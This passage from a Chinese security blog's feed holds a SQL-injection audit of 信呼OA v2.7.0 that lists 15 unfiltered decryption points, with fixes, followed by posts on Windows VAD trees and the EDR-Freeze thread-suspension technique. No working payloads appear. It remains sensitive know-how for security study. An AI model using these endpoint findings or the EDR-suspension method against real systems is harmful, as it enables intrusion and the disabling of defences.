align="left">base64decode</td><td align="left">⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">10</td><td align="left">uploadAction.php</td><td align="left">getfileAction</td><td align="left">base64decode</td><td align="left">仅xssrepstr</td><td align="left">无SQL过滤</td></tr><tr><td align="left">11</td><td align="left">upgradeAction.php</td><td align="left">shengjianssAjax</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">12</td><td align="left">upgradeAction.php</td><td align="left">shengjifile</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">13</td><td align="left">upgradeAction.php</td><td align="left">newinstallinfoAjax</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">14</td><td align="left">whereModel.php</td><td align="left">getstrwhere</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">15</td><td align="left">webmainAction.php</td><td align="left">limitRows</td><td align="left">uncrypt</td><td align="left">⭐⭐⭐⭐⭐</td><td align="left">过滤逻辑错误</td></tr></tbody></table><hr><h2 id="🎯-根本原因分析"><a href="#🎯-根本原因分析" class="headerlink" title="🎯 根本原因分析"></a>🎯 根本原因分析</h2><h3 id="1-错误的加密-安全的思维"><a href="#1-错误的加密-安全的思维" class="headerlink" title="1. 错误的加密&#x3D;安全的思维"></a>1. 错误的加密&#x3D;安全的思维</h3><p>开发者认为只要参数加密了就安全，<strong>忘记了解密后还需要过滤</strong></p><h3 id="2-过滤时机错误"><a href="#2-过滤时机错误" class="headerlink" title="2. 过滤时机错误"></a>2. 过滤时机错误</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误示例：</span></span><br><span class="line"><span class="title function_ invoke__">iconvsql</span>(<span class="variable">$encrypted_string</span>)  <span class="comment">// 过滤加密串 ← 无意义</span></span><br><span class="line">jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$filtered</span>)       <span class="comment">// 解密后恢复SQL关键字</span></span><br></pre></td></tr></table></figure><p><strong>正确应该是</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$plain</span> = jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$encrypted</span>)  <span class="comment">// 先解密</span></span><br><span class="line"><span class="variable">$safe</span>  = <span class="title function_ invoke__">iconvsql</span>(<span class="variable">$plain</span>)         <span class="comment">// 再过滤明文</span></span><br></pre></td></tr></table></figure><h3 id="3-filterstr已弃用但仍在使用"><a href="#3-filterstr已弃用但仍在使用" class="headerlink" title="3. filterstr已弃用但仍在使用"></a>3. filterstr已弃用但仍在使用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mysqlClass.php</span></span><br><span class="line"><span class="comment">//弃用过滤</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterstr</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ... 但webmainAction.php还在用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="💡-修复建议"><a href="#💡-修复建议" class="headerlink" title="💡 修复建议"></a>💡 修复建议</h2><h3 id="1-立即修复"><a href="#1-立即修复" class="headerlink" title="1. 立即修复"></a>1. 立即修复</h3><p><strong>所有解密操作后必须过滤</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修复模板</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;param&#x27;</span>));  <span class="comment">// 解密</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">iconvsql</span>(<span class="variable">$param</span>);                  <span class="comment">// 过滤明文</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">filterstr</span>(<span class="variable">$param</span>);                   <span class="comment">// 二次过滤</span></span><br><span class="line"><span class="comment">// 或使用预处理</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM table WHERE field = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$param</span>]);</span><br></pre></td></tr></table></figure><h3 id="2-使用预处理语句（PDO）"><a href="#2-使用预处理语句（PDO）" class="headerlink" title="2. 使用预处理语句（PDO）"></a>2. 使用预处理语句（PDO）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 推荐做法</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM admin WHERE mobile = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$shouji</span>]);</span><br></pre></td></tr></table></figure><h3 id="3-废弃自定义加密用于安全"><a href="#3-废弃自定义加密用于安全" class="headerlink" title="3. 废弃自定义加密用于安全"></a>3. 废弃自定义加密用于安全</h3><p><strong>加密不是安全控制</strong>，应该：</p><ul><li>移除所有”先过滤加密串”的逻辑</li><li>统一在解密后立即过滤</li><li>使用白名单验证</li></ul><hr><h2 id="🚨-影响范围"><a href="#🚨-影响范围" class="headerlink" title="🚨 影响范围"></a>🚨 影响范围</h2><p><strong>本系统存在 15个真正的解密参数SQL注入漏洞</strong>，其中：</p><ul><li><strong>1个万能SQL注入</strong> (可读取任意表)</li><li><strong>4个极危漏洞</strong> (可直接执行SQL或绕过登录)</li><li><strong>8个高危漏洞</strong> (可注入各种查询)</li><li><strong>1个任意配置写入</strong> (可能RCE)</li><li><strong>1个过滤逻辑错误</strong> (全局影响)</li></ul><p><strong>几乎所有需要认证的功能都可能被绕过！</strong></p><hr><h2 id="📝-备注"><a href="#📝-备注" class="headerlink" title="📝 备注"></a>📝 备注</h2><p>感谢你的指正！通过你指出的两个漏洞，我学会了识别**”解密后未过滤直接拼接”**这个致命模式，最终找到了全部15个漏洞。</p><p>这个系统的核心问题在于：</p><ol><li><strong>加密≠安全</strong> 的错误认知</li><li><strong>过滤时机错误</strong> (先过滤密文再解密)</li><li><strong>废弃的过滤函数仍在使用</strong></li></ol><hr><p>生成时间: 2025-10-09 审计工具: 人工代码审计 + grep搜索</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;【最终完整版】信呼OA-v2-7-0-解密SQL注入漏洞审计报告&quot;&gt;&lt;a href=&quot;#【最终完整版】信呼OA-v2-7-0-解密SQL注入漏洞审计报告&quot; class=&quot;headerlink&quot; title=&quot;【最终完整版】信呼OA v2.7.0 - 解密SQL注入</summary>
      
    
    
    
    <category term="WEB安全" scheme="https://250wuyifan.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="WEB安全" scheme="https://250wuyifan.github.io/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>jfinal CMS代码审计</title>
    <link href="https://250wuyifan.github.io/2025/10/06/jfinal%20CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://250wuyifan.github.io/2025/10/06/jfinal%20CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2025-10-06T12:24:25.000Z</published>
    <updated>2025-10-07T08:06:57.912Z</updated>
    
    <content type="html"><![CDATA[<h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251006204921827.png" alt="image-20251006204921827"></p><h1 id="有漏洞的组件"><a href="#有漏洞的组件" class="headerlink" title="有漏洞的组件"></a>有漏洞的组件</h1><h2 id="fastjson-1-2-62-极高风险"><a href="#fastjson-1-2-62-极高风险" class="headerlink" title="fastjson 1.2.62 - 极高风险"></a>fastjson 1.2.62 - 极高风险</h2><p><a href="https://www.freebuf.com/articles/web/418403.html">https://www.freebuf.com/articles/web/418403.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;搭建&quot;&gt;&lt;a href=&quot;#搭建&quot; class=&quot;headerlink&quot; title=&quot;搭建&quot;&gt;&lt;/a&gt;搭建&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main</summary>
      
    
    
    
    <category term="java安全" scheme="https://250wuyifan.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="https://250wuyifan.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>初探JSP免杀</title>
    <link href="https://250wuyifan.github.io/2025/10/04/%E5%88%9D%E6%8E%A2JSP%E5%85%8D%E6%9D%80/"/>
    <id>https://250wuyifan.github.io/2025/10/04/%E5%88%9D%E6%8E%A2JSP%E5%85%8D%E6%9D%80/</id>
    <published>2025-10-04T14:58:48.000Z</published>
    <updated>2025-10-04T15:00:19.980Z</updated>
    
    
    
    
    
    <category term="免杀" scheme="https://250wuyifan.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>JSP工作原理和免杀</title>
    <link href="https://250wuyifan.github.io/2025/10/03/JSP%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%92%8C%E5%85%8D%E6%9D%80/"/>
    <id>https://250wuyifan.github.io/2025/10/03/JSP%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%92%8C%E5%85%8D%E6%9D%80/</id>
    <published>2025-10-02T16:28:14.000Z</published>
    <updated>2025-10-02T16:28:14.141Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Java Agent</title>
    <link href="https://250wuyifan.github.io/2025/10/02/Java-Agent/"/>
    <id>https://250wuyifan.github.io/2025/10/02/Java-Agent/</id>
    <published>2025-10-02T06:18:48.000Z</published>
    <updated>2025-10-04T15:04:01.267Z</updated>
    
    
    
    
    <category term="java安全" scheme="https://250wuyifan.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="https://250wuyifan.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>VAD在进程篡改与挖空的保护</title>
    <link href="https://250wuyifan.github.io/2025/09/25/VAD%E5%9C%A8%E8%BF%9B%E7%A8%8B%E7%AF%A1%E6%94%B9%E4%B8%8E%E6%8C%96%E7%A9%BA%E7%9A%84%E4%BF%9D%E6%8A%A4/"/>
    <id>https://250wuyifan.github.io/2025/09/25/VAD%E5%9C%A8%E8%BF%9B%E7%A8%8B%E7%AF%A1%E6%94%B9%E4%B8%8E%E6%8C%96%E7%A9%BA%E7%9A%84%E4%BF%9D%E6%8A%A4/</id>
    <published>2025-09-25T13:32:54.000Z</published>
    <updated>2025-10-02T06:17:54.579Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VAD树"><a href="#VAD树" class="headerlink" title="VAD树"></a>VAD树</h1><h2 id="1-什么是-VAD-树？"><a href="#1-什么是-VAD-树？" class="headerlink" title="1. 什么是 VAD 树？"></a>1. 什么是 VAD 树？</h2><p><strong>VAD</strong> 的全称是 <strong>Virtual Address Descriptor</strong>。你可以把它想象成进程的“内存地图”或“内存目录”。</p><ul><li><strong>核心思想</strong>：每个 Windows 用户进程都有自己独立的 4GB（在 32 位系统上）或 256TB（在 64 位系统上）的虚拟地址空间。但进程并不会使用所有这些空间。VAD 树就是一个内核数据结构，它用来记录<strong>该进程当前实际使用了哪些虚拟内存区域</strong>，以及这些区域的各种属性。</li><li><strong>树形结构</strong>：VAD 不是简单的列表，而是一棵<strong>自平衡的二叉搜索树</strong>，通常是 <strong>AVL 树</strong>。这使得操作系统能够非常高效地（时间复杂度为 O(log n)）查找、插入和删除内存区域描述符。</li></ul><h2 id="2-VAD-节点里存储了什么信息？"><a href="#2-VAD-节点里存储了什么信息？" class="headerlink" title="2. VAD 节点里存储了什么信息？"></a>2. VAD 节点里存储了什么信息？</h2><p>每个 VAD 节点代表进程地址空间中一个<strong>连续的</strong>、具有相同内存属性的内存区域。一个节点通常包含以下关键信息：</p><ul><li><strong>起始地址和结束地址</strong>：定义了这个内存区域的范围。</li><li><strong>内存分配类型</strong>：<code>MEM_IMAGE</code>： 该区域映射了一个可执行文件（如 .exe, .dll）的某一部分。<code>MEM_MAPPED</code>： 该区域映射了一个数据文件（通过内存映射文件）。<code>MEM_PRIVATE</code>： 该区域是进程私有的（如堆、栈、动态分配的内存）。</li><li><strong>内存保护属性</strong>：<code>PAGE_READONLY</code>， <code>PAGE_READWRITE</code>， <code>PAGE_EXECUTE</code>， <code>PAGE_EXECUTE_READ</code>等。这决定了该内存区域是否可读、可写、可执行。</li><li><strong>控制区域指针</strong>： 这是一个指向 <code>_CONTROL_AREA</code>结构的指针，该结构进一步指向一个 <code>_SECTION_OBJECT</code>（节对象）。这对于映射文件（<code>MEM_IMAGE</code>和 <code>MEM_MAPPED</code>）至关重要，因为它将虚拟内存页面与物理文件 on disk 关联起来。<strong>简单来说</strong>：如果是映射文件，VAD 节点里的信息可以帮你找到这个内存区域背后是哪个磁盘上的文件，以及具体是文件的哪一部分。</li><li><strong>其他标志</strong>： 例如，该内存区域是否被提交、是否为守护页面等。</li></ul><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250925220447553.png" alt="image-20250925220447553"></p><h2 id="3-VAD-树的主要作用和目的"><a href="#3-VAD-树的主要作用和目的" class="headerlink" title="3. VAD 树的主要作用和目的"></a>3. VAD 树的主要作用和目的</h2><ol><li><strong>内存访问验证</strong>： 当进程尝试访问一个内存地址（例如，读取、写入或执行指令）时，内存管理器会查询该进程的 VAD 树，以确定该地址是否在一个已提交的、具有相应权限的内存区域内。如果访问无效（例如，写入一个只读页面，或访问一个未分配的区域），则会引发<strong>访问违规异常</strong>。</li><li><strong>结构化存储</strong>： 为进程的虚拟地址空间提供一个紧凑的、高效的“目录”，避免为每一个内存页面都保存元数据，从而节省资源。</li><li><strong>支持内存映射文件</strong>： VAD 是实现内存映射文件（<code>CreateFileMapping</code>&#x2F; <code>MapViewOfFile</code>）的基础。它记录了文件哪一部分被映射到了进程地址空间的哪个位置。</li></ol><h2 id="4-为什么-VAD-树对安全和分析如此重要？"><a href="#4-为什么-VAD-树对安全和分析如此重要？" class="headerlink" title="4. 为什么 VAD 树对安全和分析如此重要？"></a>4. 为什么 VAD 树对安全和分析如此重要？</h2><p>VAD 树是恶意软件分析和数字取证的“金矿”，因为它揭示了进程行为的许多秘密：</p><ul><li><strong>检测隐藏模块&#x2F;DLL</strong>： 恶意软件可能会使用一种叫做“反射式 DLL 注入”或“模块镂空”的技术，将恶意 DLL 加载到内存中，但绕过标准的 Windows 模块列表（如 PEB 中的模块链表）。然而，这种注入方式仍然需要在进程地址空间中分配内存并设置权限，因此<strong>必定会在 VAD 树中留下记录</strong>。分析 VAD 树可以发现这些隐藏的模块。</li><li><strong>检测代码注入</strong>： 当恶意软件将代码注入到另一个进程（如 <code>explorer.exe</code>）时，它必须在该进程中分配可读、可写、可执行的内存。这会在目标进程的 VAD 树中创建一个具有 <code>PAGE_EXECUTE_READWRITE</code>属性的 <code>MEM_PRIVATE</code>区域，这是一个非常可疑的迹象（因为正常程序很少需要私有的、可执行且可写的内存）。</li><li><strong>提取映射文件</strong>： 在取证中，可以从 VAD 节点中提取出已映射的文件内容。例如，如果一个恶意软件映射了一个可执行文件到内存中但并未执行，传统的动态分析工具可能无法发现它，但通过转储 VAD 树中对应的内存区域，可以恢复出完整的文件。</li><li><strong>了解进程行为</strong>： 通过查看 VAD 树，可以了解一个进程加载了哪些 DLL、映射了哪些数据文件、它的堆栈在哪里等等，从而全面了解其内存布局和行为。</li></ul><h2 id="可视化示例"><a href="#可视化示例" class="headerlink" title="可视化示例"></a>可视化示例</h2><p>想象一个进程的 VAD 树可能长这样：</p><p>复制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[VAD #2: 0x00010000 - 0x0001FFFF] (Image: notepad.exe, .text section, RX)</span><br><span class="line">       /</span><br><span class="line">[VAD Root]</span><br><span class="line">       \</span><br><span class="line">        [VAD #3: 0x00020000 - 0x0002FFFF] (Image: notepad.exe, .data section, RW)</span><br><span class="line">        \</span><br><span class="line">         [VAD #5: 0x00100000 - 0x0010FFFF] (Private Heap, RW)</span><br><span class="line">         \</span><br><span class="line">          [VAD #4: 0x00200000 - 0x0020FFFF] (Image: kernel32.dll, .text section, RX)</span><br></pre></td></tr></table></figure><h2 id="如何查看-VAD-树？"><a href="#如何查看-VAD-树？" class="headerlink" title="如何查看 VAD 树？"></a>如何查看 VAD 树？</h2><p>最常用的工具是 <strong>WinDbg</strong>（微软官方调试器）及其 <code>!vad</code>扩展命令。</p><ol><li>在 WinDbg 中附加到一个进程。</li><li>输入命令 <code>!vad</code>。</li><li>它会以文本形式打印出进程的 VAD 树，显示每个节点的地址范围、保护属性、类型等信息。</li></ol><p>商业内存取证工具如 <strong>Volatility</strong> 也内置了强大的 VAD 解析功能，可以非常直观地展示和分析 VAD 树。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>VAD 树是 Windows 内核为每个进程维护的一个高效“内存地图”，它精确描述了进程虚拟地址空间的使用情况。</strong> 它不仅是操作系统正常运作的基石，也是安全研究人员和数字取证分析师深入探究进程内部状态、检测高级威胁的不可或缺的强大工具。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VAD树&quot;&gt;&lt;a href=&quot;#VAD树&quot; class=&quot;headerlink&quot; title=&quot;VAD树&quot;&gt;&lt;/a&gt;VAD树&lt;/h1&gt;&lt;h2 id=&quot;1-什么是-VAD-树？&quot;&gt;&lt;a href=&quot;#1-什么是-VAD-树？&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
    <category term="免杀" scheme="https://250wuyifan.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>EDR-Freeze：一款让 EDR 和杀毒软件进入昏迷状态的工具</title>
    <link href="https://250wuyifan.github.io/2025/09/22/EDR-Freeze%EF%BC%9A%E4%B8%80%E6%AC%BE%E8%AE%A9-EDR-%E5%92%8C%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E8%BF%9B%E5%85%A5%E6%98%8F%E8%BF%B7%E7%8A%B6%E6%80%81%E7%9A%84%E5%B7%A5%E5%85%B7/"/>
    <id>https://250wuyifan.github.io/2025/09/22/EDR-Freeze%EF%BC%9A%E4%B8%80%E6%AC%BE%E8%AE%A9-EDR-%E5%92%8C%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E8%BF%9B%E5%85%A5%E6%98%8F%E8%BF%B7%E7%8A%B6%E6%80%81%E7%9A%84%E5%B7%A5%E5%85%B7/</id>
    <published>2025-09-22T14:37:47.000Z</published>
    <updated>2025-09-22T18:20:43.241Z</updated>
    
    <content type="html"><![CDATA[<h1 id="主要部分"><a href="#主要部分" class="headerlink" title="主要部分"></a>主要部分</h1><h2 id="Minidumpwritedump-函数"><a href="#Minidumpwritedump-函数" class="headerlink" title="Minidumpwritedump 函数"></a><code>Minidumpwritedump</code> 函数</h2><h3 id="关于-MiniDumpWriteDump-函数的基本信息"><a href="#关于-MiniDumpWriteDump-函数的基本信息" class="headerlink" title="关于 MiniDumpWriteDump 函数的基本信息"></a>关于 <code>MiniDumpWriteDump</code> 函数的基本信息</h3><p><code>MiniDumpWriteDump</code>是 Windows 系统中 <code>DbgHelp.dll</code>库提供的一个非常重要的函数。它的核心作用是<strong>为指定的进程创建一个“迷你转储文件”（Minidump）</strong>，也就是我们常说的 <strong>dump 文件</strong>。这个文件相当于进程在某个时间点的“快照”，包含了调试该进程问题（如崩溃、挂起）所需的关键信息，例如：</p><ul><li>线程信息（调用栈、寄存器状态）</li><li>模块信息（加载的 DLL）</li><li>异常信息（如果是因为未处理异常而崩溃）</li><li>可选的内存内容（根据参数决定包含多少内存）</li></ul><hr><h3 id="关键行为：挂起所有线程"><a href="#关键行为：挂起所有线程" class="headerlink" title="关键行为：挂起所有线程"></a>关键行为：挂起所有线程</h3><p>您提到的“它会挂起目标进程中的所有线程”是<strong>完全正确</strong>的，这也是这个函数最关键的行为之一。</p><ul><li><strong>为什么必须这么做？<strong>为了保证生成的 dump 文件是</strong>内部一致且有效</strong>的。想象一下，如果不挂起线程，进程中的线程仍在并发执行，它们会不断地修改内存（如堆栈、全局变量）、分配&#x2F;释放资源。在这种情况下抓取快照，得到的 dump 文件可能：<strong>数据不一致</strong>：例如，一个线程的调用栈可能正在变化，导致栈回溯信息错误。<strong>内存状态破碎</strong>：例如，抓取到的堆内存块可能处于正在分配或释放的中间状态，分析起来毫无意义。通过挂起所有线程，函数确保了在生成转储文件的整个过程中，进程的内存和状态是<strong>完全冻结</strong>的，从而得到一个具有一致性的、可用于分析的快照。</li><li><strong>何时恢复？<strong>该函数在完成数据收集后，会</strong>自动恢复</strong>所有被挂起的线程。这个过程对调用者是透明的。</li></ul><hr><h3 id="重要建议：从外部进程调用"><a href="#重要建议：从外部进程调用" class="headerlink" title="重要建议：从外部进程调用"></a>重要建议：从外部进程调用</h3><p>微软官方强烈建议<strong>不要</strong>在目标进程内部调用 <code>MiniDumpWriteDump</code>（例如，在进程自己的未处理异常过滤器中直接调用），而应该从一个<strong>独立的、外部的辅助进程</strong>来调用它。</p><ul><li><strong>为什么？<strong>主要原因正是为了避免</strong>死锁（Deadlock）</strong>。<strong>内部调用的风险</strong>：假设进程 A 发生了崩溃。<strong>线程已停止</strong>：崩溃时，发生异常的线程会暂停，等待调试器处理。进程中的其他线程可能仍在运行，也可能因为各种同步机制（如锁）而处于不确定状态。<strong>死锁场景</strong>：如果此时在进程 A 内部调用 <code>MiniDumpWriteDump</code>，该函数会尝试挂起进程 A 中<strong>所有其他线程</strong>。如果某个线程正好持有一个<strong>锁</strong>（例如，堆锁、CRT 锁、甚至是加载器锁），而挂起它时，它正持有这个锁。<code>MiniDumpWriteDump</code>函数在执行过程中，<strong>自身可能需要获取那个相同的锁</strong>来获取信息（例如，遍历模块列表需要加载器锁）。结果就是：<code>MiniDumpWriteDump</code>在等待那个锁被释放，但持有锁的线程已经被它挂起了，永远无法释放锁。这就导致了<strong>死锁</strong>，进程会永远卡住，无法生成转储文件。</li><li><strong>最佳实践：外部进程转储</strong>创建一个专门的“转储辅助程序”（Dumper Helper）。当进程 A 崩溃时，它通知（或启动）这个辅助程序。辅助程序调用 <code>DebugActiveProcess</code>函数附加到进程 A 上，使其成为一个调试器。然后，辅助程序再调用 <code>MiniDumpWriteDump</code>，并将进程 A 的句柄和 id 传给它。因为调用方是独立的外部进程，它不存在与目标进程共享锁的问题，从而完美避免了死锁的风险。这是生成转储文件最可靠、最推荐的方式。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><table><thead><tr><th>特性</th><th>说明</th></tr></thead><tbody><tr><td><strong>功能</strong></td><td>生成进程的内存转储文件（Minidump），用于调试分析。</td></tr><tr><td><strong>关键行为</strong></td><td><strong>挂起目标进程的所有线程</strong>，以确保获取到的数据快照具有一致性。</td></tr><tr><td><strong>主要风险</strong></td><td>在<strong>目标进程内部</strong>调用容易导致<strong>死锁</strong>，使转储失败。</td></tr><tr><td><strong>最佳实践</strong></td><td>始终从一个<strong>独立的、外部的辅助进程</strong>来调用此函数，以避免死锁并确保可靠性。</td></tr></tbody></table><h2 id="验证-MiniDumpWriteDump是否会暂停目标进程的所有线程"><a href="#验证-MiniDumpWriteDump是否会暂停目标进程的所有线程" class="headerlink" title="验证 MiniDumpWriteDump是否会暂停目标进程的所有线程"></a>验证 <code>MiniDumpWriteDump</code>是否会暂停目标进程的所有线程</h2><p>我们可以通过编写一个简单的测试程序来验证 <code>MiniDumpWriteDump</code>是否会暂停目标进程的所有线程。以下是实现思路：</p><ol><li><strong>目标进程（Target.exe）</strong>：创建一个多线程程序，每个线程持续运行（例如，打印日志或计算）。在运行时，我们观察线程是否被暂停。</li><li><strong>转储进程（Dumper.exe）</strong>：使用 <code>MiniDumpWriteDump</code>对目标进程进行转储。在转储期间，检查目标进程的线程状态。</li></ol><hr><h3 id="目标进程（Target-exe）"><a href="#目标进程（Target-exe）" class="headerlink" title="目标进程（Target.exe）"></a><strong>目标进程（Target.exe）</strong></h3><p>这个程序会创建多个线程，每个线程持续运行，并打印日志。</p><h3 id="C-代码（Target-cpp）"><a href="#C-代码（Target-cpp）" class="headerlink" title="C++ 代码（Target.cpp）"></a><strong>C++ 代码（Target.cpp）</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数：持续运行并打印日志</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">WorkerThread</span><span class="params">(<span class="type">int</span> threadId)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Thread &quot;</span> &lt;&lt; threadId &lt;&lt; <span class="string">&quot; is running...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::this_thread::sleep_for(<span class="built_in">std</span>::chrono::seconds(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Target Process Started (PID: &quot;</span> &lt;&lt; GetCurrentProcessId() &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建 3 个工作线程</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::thread&gt; threads;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        threads.emplace_back(WorkerThread, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主线程也打印日志</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Main thread is running...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::this_thread::sleep_for(<span class="built_in">std</span>::chrono::seconds(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译 &amp; 运行：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ Target.cpp -o Target.exe 